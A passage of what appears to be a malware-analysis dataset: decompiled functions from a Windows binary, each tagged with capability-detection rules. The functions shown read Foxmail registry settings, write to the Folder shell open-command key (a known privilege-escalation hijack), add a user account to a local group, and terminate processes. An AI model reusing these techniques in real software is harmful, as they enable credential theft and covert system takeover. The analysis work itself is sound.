        "decompiled_code": "\nvoid __fastcall fcn.00414e90(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (*param_1 != 0) {\n        fcn.00414d63();\n    }\n    fcn.00406ccd();\n    fcn.00406f1d();\n    param_1[8] = 0;\n    fcn.00406f1d();\n    param_1[7] = 0;\n    fcn.00406f1d();\n    param_1[6] = 0;\n    fcn.00406f1d();\n    param_1[5] = 0;\n    fcn.00406f1d();\n    param_1[4] = 0;\n    fcn.00414d63();\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1, unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 221
    },
    "004154ca": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004154ca(uint *param_1)\n\n{\n    uint extraout_EDX;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    fcn.00406ca5();\n    return extraout_EDX;\n}\n",
        "token_count": 117
    },
    "00416c63": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00416c63(uint *param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00406e5c();\n    *param_1 = uVar1;\n    uVar1 = fcn.00406e5c();\n    param_1[1] = uVar1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    return param_1;\n}\n",
        "token_count": 127
    },
    "00416f80": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00416f80(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    param_1[4] = 5;\n    param_1[2] = 5;\n    param_1[3] = 0;\n    uVar1 = fcn.00406fa7();\n    param_1[1] = uVar1;\n    param_1[5] = 0x5520c0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    param_1[0xb] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0;\n    iVar2 = fcn.00406fa7();\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.004166fa(extraout_ECX);\n    }\n    *param_1 = uVar1;\n    fcn.0041699c();\n    if (param_1[3] != 0) {\n        do {\n            fcn.004167ca(arg_8h);\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < param_1[3]);\n    }\n    return param_1;\n}\n",
        "token_count": 362
    },
    "004047c6": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047c6(uint arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = arg_8h;\n    in_ECX[1] = 0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "00405980": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405980(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4198bc;\n    fcn.00404656(&arg_8h);\n    in_ECX[2] = arg_ch;\n    *(in_ECX + 3) = arg_10h;\n    fcn.00404656(&arg_14h);\n    fcn.0040153f(&arg_18h);\n    fcn.004022f8();\n    fcn.00401586();\n    return;\n}\n",
        "token_count": 147
    },
    "00410e64": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410e64(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    uVar5 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 0x10);\n    if (iVar3 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n    if (iVar4 == 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x420) goto code_r0x00410ed4;\n        (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n        if (iVar4 == 0) goto code_r0x00410ed4;\n    }\n    uVar5 = 1;\ncode_r0x00410ed4:\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    (*pcVar1)(iVar3);\n    return uVar5;\n}\n",
        "token_count": 371
    },
    "00413ada": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00413ada(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 60
    },
    "00414047": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00414047(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 60
    },
    "00415c58": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415c58(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(1);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    return (iVar1 * (arg_8h * 0x359 + 1)) % 10000;\n}\n",
        "token_count": 85
    },
    "00403556": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403556(uint param_1, int32_t param_2)\n\n{\n    uint oflag;\n    \n    if (*(param_2 + 4) == 0) {\n        fcn.00404656(param_2 + 8);\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", param_1, 0, 0, 5);\n        fcn.00406f1d();\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00406f2c": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406f2c(uint param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    return;\n}\n",
        "token_count": 50
    },
    "00414ac7": {
        "rules": [
            "open process",
            "terminate process"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00414ac7(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, param_1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "0040c237": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint fcn.0040c237(void)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\\\\Aerofox\\\\FoxmailPreview\", 0, 0x20019, &hKey);\n    if (iVar1 == 0) {\n        var_4h = 0x104;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, \"Executable\", 0, 0, 0x41e7b8, &var_4h);\n        if (iVar1 == 0) {\n            (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecA)(0x41e7b8);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "00414e25": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00414e25(uint hKey, uint *arg_ch, uint samDesired, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_14h != 0) && (iVar1 = fcn.0041340d(),  iVar1 == 0)) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, *arg_ch, 0, 0, 0, samDesired, 0);\n        if (iVar1 != 0) {\n            return false;\n        }\n        fcn.00414d63();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, *arg_ch, 0, samDesired);\n    return iVar1 == 0;\n}\n",
        "token_count": 185
    },
    "0041570f": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041570f(uint lpValueName, uint lpString)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint hKey;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                      (0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\", 0, 0x20006, &hKey);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, lpValueName, 0, 1, lpString, uVar1);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_SetLastError)(iVar2);\n    return 0;\n}\n",
        "token_count": 218
    },
    "00415774": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.00415774(void)\n\n{\n    int32_t iVar1;\n    uint pSecurityDescriptor;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&pSecurityDescriptor, 1);\n    if ((iVar1 != 0) &&\n       (iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(&pSecurityDescriptor, 1, 0, 0),  iVar1 != 0)) {\n        var_10h = &pSecurityDescriptor;\n        var_14h = 0xc;\n        var_ch = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\", 0, 0, 0, 0x20006, &var_14h, \n                           &hKey, &var_8h);\n        if (iVar1 == 0) {\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 293
    },
    "00415884": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.00415884(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint phkResult;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, 0x41c6bc, 0, 0xf003f, &phkResult);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, 0x41c6bc, 0, 0, 0, 0xf003f, 0, &phkResult, &var_8h);\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x551c00);\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(phkResult, 0x41c6dc, 0, 1, 0x551c00, iVar1 << 2);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    return;\n}\n",
        "token_count": 240
    },
    "004105c0": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004105c0(uint *pcbBinary)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar2;\n    uint pszString;\n    \n    iVar2 = 0;\n    *pcbBinary = 0;\n    *in_EDX = 0;\n    iVar1 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryW)();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, *pcbBinary);\n        *in_EDX = iVar1;\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryW)(in_ECX, 0, 1, iVar1, pcbBinary, 0, 0);\n            if (iVar2 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LocalFree)(*in_EDX);\n                *in_EDX = iVar1;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 240
    },
    "00410d7a": {
        "rules": [
            "add user account"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00410d7a(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    var_8h = 0x10201;\n    var_20h = *arg_8h;\n    var_18h = 0;\n    var_14h = 1;\n    var_10h = 0;\n    var_1ch = *arg_ch;\n    var_ch = 0;\n    var_4h = 0;\n    iVar1 = (*_sym.imp.NETAPI32.dll_NetUserAdd)(0, 1, &var_20h, 0);\n    if (iVar1 == 0) {\n        arg_8h = *puVar2;\n        puVar2 = fcn.00413248();\n        iVar1 = (*_sym.imp.NETAPI32.dll_NetLocalGroupAddMembers)(0, *puVar2, 3, &arg_8h, 1);\n        fcn.00406f1d();\n        bVar3 = iVar1 == 0;\n    }\n    else {\n        bVar3 = false;\n    }\n    return bVar3;\n}\n",
        "token_count": 331
    },
    "0041471f": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.0041471f(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(in_FS_OFFSET + 0x30) != 0) {\n        return *(***(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00402b2d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402b2d(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = param_1 + iVar2 * 4;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -1;\n        fcn.00406f1d();\n        *puVar1 = 0;\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 137
    },
    "00402da0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402da0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    \n    uVar1 = in_ECX[2];\n    if (in_ECX[1] <= uVar1) {\n        iVar2 = in_ECX[3];\n        iVar3 = fcn.00406fa7();\n        uVar4 = 0;\n        if (in_ECX[2] != 0) {\n            do {\n                *(iVar3 + uVar4 * 4) = *(*in_ECX + uVar4 * 4);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < in_ECX[2]);\n        }\n        fcn.00406f8d();\n        in_ECX[1] = (uVar1 + 1) * iVar2;\n        *in_ECX = iVar3;\n    }\n    *(*in_ECX + in_ECX[2] * 4) = arg_8h;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 269
    },
    "00402e04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e04(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    in_ECX[2] = 0;\n    in_ECX[3] = 5;\n    in_ECX[1] = 5;\n    iVar3 = fcn.00406fa7();\n    uVar6 = 0;\n    *in_ECX = iVar3;\n    if (arg_8h[2] != 0) {\n        do {\n            fcn.00406d65();\n            uVar1 = *(*arg_8h + uVar6 * 4);\n            uVar2 = in_ECX[2];\n            if (in_ECX[1] <= uVar2) {\n                iVar3 = in_ECX[3];\n                iVar4 = fcn.00406fa7();\n                uVar5 = 0;\n                if (in_ECX[2] != 0) {\n                    do {\n                        *(iVar4 + uVar5 * 4) = *(*in_ECX + uVar5 * 4);\n                        uVar5 = uVar5 + 1;\n                    } while (uVar5 < in_ECX[2]);\n                }\n                fcn.00406f8d();\n                *in_ECX = iVar4;\n                in_ECX[1] = (uVar2 + 1) * iVar3;\n            }\n            *(*in_ECX + in_ECX[2] * 4) = uVar1;\n            in_ECX[2] = in_ECX[2] + 1;\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < arg_8h[2]);\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "00406e06": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406e06(void)\n\n{\n    code **ppcVar1;\n    code **ppcVar2;\n    \n    if (*0x5530c4 != 0) {\n        ppcVar1 = *0x552b74 + *0x5530c4;\n        for (ppcVar2 = *0x552b74; ppcVar2 < ppcVar1; ppcVar2 = ppcVar2 + 1) {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00407804": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407804(int32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar2 = *(param_1 + 0xc);\n    iVar3 = *(param_1 + 4) - param_2;\n    puVar1 = puVar2 + param_2;\n    if (iVar3 < 1) {\n        *puVar2 = 0;\n        *(param_1 + 4) = 1;\n    }\n    else {\n        do {\n            iVar3 = iVar3 + -1;\n            *puVar2 = *puVar1;\n            puVar2 = puVar2 + 1;\n            puVar1 = puVar1 + 1;\n        } while (0 < iVar3);\n        *(param_1 + 4) = *(param_1 + 4) - param_2;\n    }\n    return param_1;\n}\n",
        "token_count": 219
    },
    "00407dd5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407dd5(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *(param_1 + 4);\n    if (piVar2 != NULL) {\n        do {\n            piVar1 = *piVar2;\n            fcn.00401014(piVar2[3]);\n            fcn.00401014(piVar2);\n            piVar2 = piVar1;\n        } while (piVar1 != NULL);\n        *(param_1 + 0x3c) = 0;\n        *(param_1 + 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004102a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004102a4(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 5;\n    *0x552f74 = 5;\n    *0x552f6c = 5;\n    *0x552f70 = 0;\n    fcn.004029af();\n    *0x552f84 = 5;\n    *0x552f7c = 5;\n    *0x552f80 = 0;\n    puVar1 = fcn.00406fa7();\n    if (puVar1 == NULL) {\n        *0x552f78 = NULL;\n    }\n    else {\n        *0x552f78 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = *0x552f78;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            puVar1[2] = 0;\n            puVar1[3] = 0;\n            iVar2 = iVar2 + -1;\n            puVar1 = puVar1 + 10;\n        } while (iVar2 != 0);\n    }\n    *0x552f8c = ZEXT816(0);\n    *0x552f9c = ZEXT816(0);\n    *0x552fac = 0;\n    *0x552fb0 = 0;\n    *0x552fb4 = 0;\n    *0x552fc8 = ZEXT816(0);\n    *0x552fd8 = ZEXT816(0);\n    *0x552fe8 = ZEXT816(0);\n    *0x552ff8 = ZEXT816(0);\n    *0x553008 = 0;\n    *0x55300c = 0;\n    return 0x552f68;\n}\n",
        "token_count": 412
    },
    "004104d3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004104d3(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    if ((param_1 != 0) && (param_2 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, param_2 * 2 + 2);\n        if ((iVar1 != 0) && (param_2 != 0)) {\n            do {\n                *(iVar1 + uVar2 * 2) = *(uVar2 + param_1);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < param_2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 186
    },
    "00410680": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00410680(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = *0x41e150;\n    do {\n        if (puVar2 == 0x41e150) {\n            return NULL;\n        }\n        iVar1 = 0;\n        while (*(param_1 + iVar1 * 4) == puVar2[iVar1 + 2]) {\n            iVar1 = iVar1 + 1;\n            if (iVar1 == 4) {\n                return puVar2;\n            }\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 148
    },
    "00414227": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00414227(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    fcn.00413fc0();\n    iVar3 = 5;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x38) = 5;\n    *(param_1 + 0x30) = 5;\n    *(param_1 + 0x34) = 0;\n    puVar1 = fcn.00406fa7();\n    if (puVar1 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar1 + 0xb;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar3 = iVar3 + -1;\n            puVar1 = puVar1 + 0xc;\n        } while (iVar3 != 0);\n    }\n    *(param_1 + 0x2c) = puVar2;\n    *(param_1 + 0x3c) = 0;\n    return param_1;\n}\n",
        "token_count": 301
    },
    "00415c0e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * fcn.00415c0e(void)\n\n{\n    code *pcVar1;\n    uint var_4h;\n    \n    for (pcVar1 = fcn.00415c0e; *pcVar1 != 0x905a4d; pcVar1 = pcVar1 + -1) {\n    }\n    return pcVar1;\n}\n",
        "token_count": 81
    },
    "0041649c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041649c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    iVar2 = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    ppv = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x419420, 0, 1, 0x4193d0, &ppv);\n    if (ppv != NULL) {\n        (**(*ppv + 0xc))(ppv, 0x419410, &var_4h, 0);\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x14))(var_4h);\n            while( true ) {\n                iVar1 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, 0);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 1;\n                if (var_ch != NULL) {\n                    (**(*var_ch + 8))(var_ch);\n                    var_ch = NULL;\n                }\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 8))(var_4h);\n                var_4h = NULL;\n            }\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return iVar2;\n}\n",
        "token_count": 356
    },
    "00416579": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416579(uint arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = 0;\n    iVar2 = 0;\n    do {\n        if (*(arg_ch + iVar2 * 4) != *(iVar2 * 4 + 0x4193f0)) goto code_r0x0041659f;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 4);\ncode_r0x004165ad:\n    *arg_10h = arg_8h;\n    return 0;\ncode_r0x0041659f:\n    do {\n        if (*(arg_ch + iVar1 * 4) != *(iVar1 * 4 + 0x4193b0)) {\n            return 0x80004002;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 4);\n    goto code_r0x004165ad;\n}\n",
        "token_count": 228
    },
    "0041667f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041667f(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = 0;\n    do {\n        if (*(arg_8h + 0x10 + iVar1 * 4) != *(iVar1 * 4 + 0x419460)) {\n            iVar1 = 0;\n            do {\n                if (*(arg_8h + 0x10 + iVar1 * 4) != *(iVar1 * 4 + 0x419450)) {\n                    do {\n                        if (*(arg_8h + 0x10 + iVar2 * 4) != *(iVar2 * 4 + 0x419440)) {\n                            return;\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 != 4);\n                    *(in_ECX + 4) = 0x20;\n                    return;\n                }\n                iVar1 = iVar1 + 1;\n            } while (iVar1 != 4);\n            *(in_ECX + 4) = 0x18;\n            return;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 4);\n    *(in_ECX + 4) = 0x10;\n    return;\n}\n",
        "token_count": 299
    },
    "0041674f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041674f(uint noname_0, int32_t **arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = arg_ch;\n    iVar2 = *in_ECX;\n    iVar4 = 0;\n    *arg_ch = NULL;\n    puVar5 = &var_8h;\n    var_ch = in_EDX;\n    iVar2 = (**(iVar2 + 0x28))();\n    if (-1 < iVar2) {\n        iVar2 = -0x7fffbffb;\n        while (iVar3 = (**(*var_8h + 0xc))(var_8h, 1, &arg_ch, &var_10h),  iVar3 == 0) {\n            var_4h = 3;\n            (*(*arg_ch)[9])(arg_ch, &var_4h);\n            if (var_4h == var_ch) {\n                if (iVar4 == 0) {\n                    *ppiVar1 = arg_ch;\n                    return 0;\n                }\n                iVar4 = iVar4 + -1;\n            }\n            (*(*arg_ch)[2])(arg_ch, puVar5);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 346
    },
    "0041699c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041699c(void)\n\n{\n    int16_t *piVar1;\n    uchar uVar2;\n    int16_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint pvarg;\n    int16_t *var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    var_ch = NULL;\n    ppv = NULL;\n    var_4h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x419420, 0, 1, 0x41c870, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x419410, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        iVar6 = 0;\n        while( true ) {\n            iVar7 = 0;\n            var_10h = 0;\n            iVar5 = (**(*var_4h + 0xc))(var_4h, 1, &var_14h, &var_10h);\n            if ((iVar5 != 0) ||\n               (piVar4 = var_14h + iVar6 * 4,  iVar5 = (**(*piVar4 + 0x24))(piVar4, 0, 0, 0x4193a0, &var_ch), \n               iVar5 != 0)) break;\n            (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n            iVar5 = (**(*var_ch + 0xc))(var_ch, 0x41c808, &pvarg, 0);\n            if ((iVar5 != 0) && (iVar5 = (**(*var_ch + 0xc))(var_ch, L\"FriendlyName\", &pvarg, 0),  iVar5 != 0)) break;\n            iVar5 = fcn.00406fa7();\n            if (iVar5 == 0) {\n                piVar4 = NULL;\n            }\n            else {\n                piVar4 = fcn.00416c63();\n            }\n            iVar3 = *var_20h;\n            piVar1 = var_20h;\n            while (iVar3 != 0) {\n                *(piVar4[1] + iVar7 * 2) = iVar3;\n                uVar2 = *piVar1;\n                piVar1 = piVar1 + 1;\n                *(iVar7 + *piVar4) = uVar2;\n                iVar7 = iVar7 + 1;\n                iVar3 = *piVar1;\n            }\n            piVar4[2] = iVar6;\n            fcn.00402da0(piVar4);\n            iVar6 = iVar6 + 1;\n        }\n        if (var_4h != NULL) 